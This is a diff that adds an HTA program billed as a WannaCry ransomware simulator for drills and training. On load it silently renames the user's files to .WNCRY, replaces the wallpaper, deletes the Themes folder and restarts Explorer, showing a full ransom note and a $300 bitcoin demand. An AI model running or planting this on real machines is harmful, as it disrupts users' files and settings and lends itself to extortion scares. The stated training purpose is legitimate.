@@ -1,0 +1,229 @@
+<!-- 
+WannaCry_HTA 是一个基于 HTA（HTML Application）技术开发的高度仿真 WannaCry 勒索病毒界面模拟程序。该项目完全可控，专为安全研究、应急演练和安全教育场景设计。
+作者：https://github.com/lintx0
+-->
+<!-- HTA应用程序配置 -->
+<HTA:Application MaximizeButton='no' MinimizeButton='no' Scroll='no' Border='dialog' icon='WannaCry.ico' style='z-index: 1;' />
+<title>Wana Decrypt0r 2.0</title>
+<script type="text/javascript">
+// 设置窗口大小为830x580像素
+window.resizeTo(830, 580);
+// 页面加载完成后执行初始化函数，运行后会执行一次加密函数
+window.onload=function(){getDate();wonclick();wchange();encrypt()}
+// 实时时钟显示函数
+function getDate(){
+    // 每0.5秒更新一次时间显示
+    window.setTimeout(function(){getDate()},1000/2)
+    
+    // 获取当前时间
+    var d=new Date();   
+    var year=d.getFullYear()  
+    var month=d.getMonth()+1
+    var days=d.getDate() 
+    var hour=d.getHours()  
+    var minute=d.getMinutes() 
+    var second=d.getSeconds()
+    
+    // 格式化时间显示（补零）
+    if(month<10) month="0"+month
+    if(days<10) days="0"+days
+    if(hour<10) hour="0"+hour
+    if(minute<10) minute="0"+minute
+    if(second<10) second="0"+second
+    
+    // 计算倒计时（60秒循环）
+    var secondd=60-parseFloat(second)
+    if(secondd<10) secondd="0"+secondd
+    
+    // 获取时间显示元素
+    var TIME0=document.getElementById("TIME0")
+    var TIME1=document.getElementById("TIME1")
+    var TIME2=document.getElementById("TIME2")
+    var TIME3=document.getElementById("TIME3")
+    
+    // 格式化日期时间字符串
+    var da=month+"/"+days+"/"+year+" "+hour+":"+minute+":"+second
+    
+    // 更新页面上的时间显示
+    TIME0.innerHTML=da
+    TIME1.innerHTML=da
+    TIME2.innerHTML="02:23:59:"+secondd
+    TIME3.innerHTML="06:23:59:"+secondd
+}
+// 按钮点击事件处理函数
+function wonclick(){
+    var btn1 = document.getElementById("btn1");
+    var btn2 = document.getElementById("btn2");
+    
+    // Copy按钮点击事件 - 显示免责声明
+    btn1.onclick = function () {alert("免责声明：代码仅修改后缀模拟加密程序，仅用于应急演练模拟和学习使用。")}
+    
+    // Check Payment按钮点击事件 - 执行加密
+    btn2.onclick = function () {encrypt();}
+}
+// 语言切换函数
+function wchange(){
+    var num=document.getElementById("seid").selectedIndex;
+    
+    // 根据选择的语言更新说明文本
+    if(num==0) {
+        // 英文说明
+        document.getElementById("wtext").value="What's wrong with my computer?\nSome of your important files were saved by my encryption\nPhotos, pictures, documents, compressed packages, audio, video files, exe files, etc., almost all types of files are encrypted, and therefore can not open normally.\nThis is a fundamental difference between the general file damage, you can find a way to restore the file on the Internet, I guarantee that we do not have the decryption service, even if God can not restore these documents.\nIs there a way to restore these documents?\nOf course there are recoverable methods. Can only be restored through our decryption service. To provide a safe and effective recovery service.\nBut this is a charge, and can not be infinitely delayed.\nPlease click the <Decrypt> button and have the opportunity to recover some documents for free. Please rest assured that I will never lie to you.\nBut you want to restore all documents, you need to pay the cost.\nWhether it can be fixed at any time the amount of payment, will be restored, of course not, the longer the delay in the payment of the more unfavorable to you.\nIt is best to pay the day immediately, every day the cost will be doubled.\nAlso, within the specified time without payment, will never be restored.\nYes, forgot to tell you, for more than six months no money to pay the poor, there will be free to resume activities, can turn to see you luck."
+    }
+    if(num==1) {
+        // 中文说明
+        document.getElementById("wtext").value="我的电脑出了什么问题？\n您的一些重要文件被我加密保存了\n照片、图片、文档、压缩包、音频、视频文件、exe文件等，几乎所有类型的文件都被加密了，因此不能正常打开。\n这和一般文件损坏有本质上的区别，您大可在网上找找恢复文件的方法，我很保证，没有我们的解密服务，就算老天爷来了也不能恢复这些文档。\n有没有恢复这些文档的方法？\n\n当然有可恢复的方法。只能通过我们的解密服务才能恢复。以人格担保，能够提供安全有效的恢复服务。\n但这是收费的，也不能无限的推迟。\n请点击<Decrypt>按钮，就有机会免费恢复一些文档。请您放心，我是绝不会骗你的。\n但想要恢复全部文档，需要付款点费用。\n是否随时都可以固定金额付款，就会恢复吗，当然不是，推迟付款时间越长对你越不利。\n最好当天马上付款费用，每过一天费用就会翻倍。\n还有，指定时间之内未付款，将会永远恢复不了。\n对了，忘了告诉你，对半年以上没钱付款的穷人，会有活动免费恢复，能否轮到您就看运气了。"
+    }
+}
+</script>
+<!-- HTML页面结构 -->
+<html>
+<body style='margin: 0;'>
+<!-- 主容器 - 红色背景 -->
+<div style='height: 1000px;background-color: #841212;'>
+    <!-- 标题 -->
+    <a style='color: white;font-size: 20;font-weight: bold;position: absolute;top: 5;left: 260;'>Ooops,your files have been encrypted!</a>
+    
+    <!-- 语言选择下拉框 -->
+    <form style='position: absolute;left: 680;top: 10;'>
+        <select style='width: 129;' onchange='wchange()' id='seid'>
+            <option>English</option>
+            <option>Chinese</option>
+        </select>
+    </form>
+    
+    <!-- 时间显示框 -->
+    <div style='position: absolute;border: 1px solid white;height: 130px;width: 215px;top: 141;left: 5;'></div>
+    <div style='position: absolute;border: 1px solid white;height: 130px;width: 215px;top: 288;left: 5;'></div>
+    
+    <!-- 时间标签 -->
+    <a style='position: absolute;top: 150;left: 25;font-size: 12;color: #E4B54F;font-weight: bold;'>Payment will be raised on</a>
+    <a style='position: absolute;top: 300;left: 25;font-size: 12;color: #E4B54F;font-weight: bold;'>Your files will be lost on</a>
+    <a style='position: absolute;top: 210;left: 80;font-size: 13;color: white;'>Time Left</a>
+    <a style='position: absolute;top: 355;left: 80;font-size: 13;color: white;'>Time Left</a>
+    
+    <!-- 链接区域 -->
+    <a href='#' style='position: absolute;top: 440;left: 30;font-size: 13;color: white;'>About   bitcoin</a>
+    <a href='#' style='position: absolute;top: 470;left: 30;font-size: 13;color: white;'>How  to  buy  bitcoins?</a>
+    <a href='#' style='position: absolute;top: 500;left: 30;font-size: 14;color: white;font-weight: bold;'>Contact  Us</a>
+    
+    <!-- 比特币地址显示框 -->
+    <div style='position: absolute;border: 1px solid white;height: 70px;width: 577px;top: 428;left: 230;'></div>
+    <a style='position: absolute;top: 433;left: 375;font-size: 14;color: #E4B54F;font-weight: bold;'>Send $300 worth of bitcoin to this address:</a>
+    
+    <!-- 按钮区域 -->
+    <input type='button' id='btn1' value='Copy' style='position: absolute;top: 455;left: 770;width: 35;height: 42;font-size: 10;'>
+    <input type='button' id='btn2' value='Check Payment' style='position: absolute;top: 505;left: 230;height: 25;width: 280;font-size: 13;font-weight: bold;'>
+    <input type='button' id='btn3' value='Decrypt' style='position: absolute;top: 505;left: 530;width: 280;height: 25;font-size: 13;font-weight: bold;' onclick="decrypt()">
+    
+    <!-- 比特币地址输入框（Base64编码的GitHub下载链接https://github.com/lintx0） -->
+    <textarea style='position: absolute;top: 460;width: 395;left: 375;height: 30;background-color: #841212;color: white;font-size: 20;border-style: solid;resize: none;overflow: hidden;'>aHR0cHM6Ly9naXRodWIuY29tL2xpbnR4MA==</textarea>
+    
+    <!-- 时间显示元素 -->
+    <div id="TIME0" style="position: absolute;top: 180;left: 40;font-size: 13;color: white;"></div>
+    <div id="TIME1" style="position: absolute;top: 330;left: 40;font-size: 13;color: white;"></div>
+    <div id="TIME2" style="position: absolute;top: 230;left: 15;font-size: 30;color: white;"></div>
+    <div id="TIME3" style="position: absolute;top: 375;left: 15;font-size: 30;color: white;"></div>
+    
+    <!-- 说明文本区域 -->
+    <textarea id='wtext' style='position: absolute;top: 40;left: 230;width: 579;height: 380;border-style: inset;font-size: 17;line-height: 1.3;resize: none;background-color: #F0F0F0;'></textarea>
+    
+    <!-- 图片元素 -->
+    <img src='1.png' style='position: absolute;left: 50;top: 10;'>
+    <img src='2.png' style='position: absolute;left: 190;top: 165;'>
+    <img src='2.png' style='position: absolute;left: 190;top: 315;'>
+    <img src='3.png' style='position: absolute;left: 230;top: 435;'>
+</div>
+</body>
+</html>
+
+<!-- VBScript脚本 - 核心功能实现 -->
+<script LANGUAGE="VBScript">
+' 加密函数 - 模拟文件加密过程
+function encrypt
+    ' 创建WScript.Shell对象用于执行系统命令
+    set ws=CreateObject("WScript.Shell")
+    set env=ws.Environment("Process")
+    set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' 执行文件重命名命令 - 将文件后缀改为.WNCRY（模拟加密）
+    ' 排除.exe、.hta和.WNCRY文件
+    ws.run "cmd /c  for /f %f in ('dir /b /a-d') do echo %f |findstr /v "".exe .hta .WNCRY""&&ren %f %f.WNCRY",0
+    
+    ' 检查并创建临时目录
+    If  fso.folderExists("C:\Windows\Temp\WannaCry_HTA")Then
+    else
+        fso.Createfolder("C:\Windows\Temp\WannaCry_HTA")
+    end if
+    
+    ' 检查是否已经执行过加密（通过检查备份文件）
+    If fso.fileExists("C:\Windows\Temp\WannaCry_HTA\wallpaper_bak.jpg") Then
+        ' 如果已加密，清理临时文件并显示提示
+        ws.run "cmd /c rd /s /q WannaCry_HTA",0
+        alert("Your Files Have Been Encrypted")
+    else
+        ' 首次执行加密时的处理
+        ' 备份当前桌面壁纸
+        set f = fso.CreateTextFile("C:\Windows\Temp\WannaCry_HTA\wallpaper_bak.txt", true) 
+        f.Write(ws.regread("HKCU\Control Panel\Desktop\wallpaper"))
+        f.Close()
+        
+        ' 读取当前壁纸路径
+        fread=ws.regread("HKCU\Control Panel\Desktop\wallpaper")
+        
+        ' 备份原壁纸并设置新的勒索壁纸
+        ws.run "cmd /c copy "&Chr(34)&fread&Chr(34)&" C:\Windows\Temp\WannaCry_HTA\wallpaper_bak.jpg /Y &&copy WannaCry_HTA\wallpaper.bmp "&Chr(34)&fread&Chr(34)&" /Y &&rd /s /q WannaCry_HTA",0
+        
+        ' 处理主题目录
+        if instr(fread,"\AppData\Roaming\Microsoft\Windows\Themes")>0 Then
+        else
+            ws.run "cmd /c echo Y | rmdir /s "&env.Item("HOMEDRIVE")&env.Item("HOMEPATH")&"\AppData\Roaming\Microsoft\Windows\Themes",0
+        end if
+        
+        ' RUNDLL32刷新和重启Explorer进程以应用新壁纸
+        ws.run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+        ws.run "cmd /c ping -n 1 127.0.0.1>nul &&taskkill /IM explorer.exe /F&&start c:\Windows\Explorer.exe",0
+    end if
+    
+    ' 清理临时文件
+    ws.run "cmd /c rd /s /q WannaCry_HTA",0
+end function
+' 解密函数 - 恢复文件
+function decrypt
+    ' 创建WScript.Shell对象
+    set ws=CreateObject("WScript.Shell")
+    set env=ws.Environment("Process")
+    set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' 恢复文件后缀（移除.WNCRY后缀）
+    ws.run "cmd /c for /f %f in ('dir /b /a-d') do echo %f |findstr .WNCRY &&ren *.WNCRY *. ",0
+    
+    ' 恢复桌面壁纸
+    If fso.fileExists("C:\Windows\Temp\WannaCry_HTA\wallpaper_bak.txt") Then
+        set f = fso.OpenTextFile("C:\Windows\Temp\WannaCry_HTA\wallpaper_bak.txt", 1, false)
+        If f.AtEndOfStream Then
+        else
+            fread=f.ReadAll()
+            ' 恢复原壁纸
+            ws.run "cmd /c copy C:\Windows\Temp\WannaCry_HTA\wallpaper_bak.jpg "&Chr(34)&fread&Chr(34)&"  /Y",0
+            
+            ' 处理主题目录
+            if instr(fread,"\AppData\Roaming\Microsoft\Windows\Themes")>0 Then
+            else
+                ws.run "cmd /c echo Y | rmdir /s "&env.Item("HOMEDRIVE")&env.Item("HOMEPATH")&"\AppData\Roaming\Microsoft\Windows\Themes",0
+            end if
+            f.Close()
+        end if
+    end if
+    
+    ' RUNDLL32刷新和重启Explorer进程以恢复壁纸
+    ws.run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
+    ws.run "cmd /c ping -n 1 127.0.0.1>nul &&taskkill /IM explorer.exe /F&&start c:\Windows\Explorer.exe",0
+    
+    ' 清理临时文件
+    ws.run "cmd /c ping -n 3 127.0.0.1>nul &&cmd /c echo Y |cmd /c rmdir /s C:\Windows\Temp\WannaCry_HTA",0
+    
+    ' 显示解密完成提示
+    alert("Your Files Have Been Decrypted")
+end function
+</script>
